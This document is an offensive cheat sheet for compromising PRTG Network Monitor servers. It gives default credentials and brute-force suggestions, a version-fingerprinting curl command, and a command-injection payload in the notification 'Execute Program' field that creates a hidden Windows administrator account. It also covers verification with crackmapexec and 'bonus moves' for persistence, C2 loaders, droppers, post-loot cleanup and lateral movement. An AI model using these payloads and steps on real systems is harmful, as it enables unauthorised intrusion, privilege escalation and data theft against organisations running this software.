🧠 “Got This → Do That” – PRTG Edition
✅ Got This: Port 8080 (or 80/443) shows Paessler / Indy httpd / PRTG
Do This:

Try creds:

prtgadmin:prtgadmin

prtgadmin:Password123

Or test weak creds via Hydra / Burp / Intruder if needed

Confirm version in HTML:

perl
Copy
Edit
curl -s http://<IP>:8080/index.htm | grep version
✅ Got This: Version < 18.2.39 (e.g., 17.3.33) + Logged In

Head to:
Setup → Account Settings → Notifications

Click Add new notification

✅ Got This: Access to “Execute Program” field

Add user + elevate to admin (blind RCE):

sql
Copy
Edit
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
Or, spawn rev shell (PowerShell-style one-liner or Invoke-WebRequest)

✅ Got This: Payload submitted
Do This:

Click Test → confirm “queued” popup

No feedback (blind exec), so validate with:

bash
Copy
Edit
crackmapexec smb <ip> -u prtgadm1 -p 'Pwn3d_by_PRTG!'

🧠 Bonus Moves:
Set scheduled notification for persistence

Create a “beaconing” script for callback every X mins

Replace command with C2 loader or dropper

Cleanup user from net user prtgadm1 /delete after loot

🪓 Quick Real-World Tip:
Most orgs treat PRTG as “just a monitor,” not a threat. But if it's running as SYSTEM and you pop it with one notification, you now own every metric, SNMP trap, or alert coming through it—great for lateral movement or passive data theft.
